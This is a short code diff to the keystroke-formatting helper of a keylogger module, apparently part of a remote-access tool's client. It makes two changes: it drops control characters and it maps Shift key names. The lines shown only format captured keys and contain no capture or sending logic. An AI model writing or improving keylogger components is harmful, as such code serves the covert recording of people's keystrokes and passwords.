@@ -6,6 +6,8 @@ namespace xClient.Core.Keylogger
     {
         public static string Filter(char key)
         {
+            if ((int)key < 32) return string.Empty;
+
             switch (key)
             {
                 case '<':
@@ -34,6 +36,8 @@ namespace xClient.Core.Keylogger
                 return "Alt";
             else if (key.Contains("Win"))
                 return "Win";
+            else if (key.Contains("Shift"))
+                return "Shift";
             return key;
         }
 
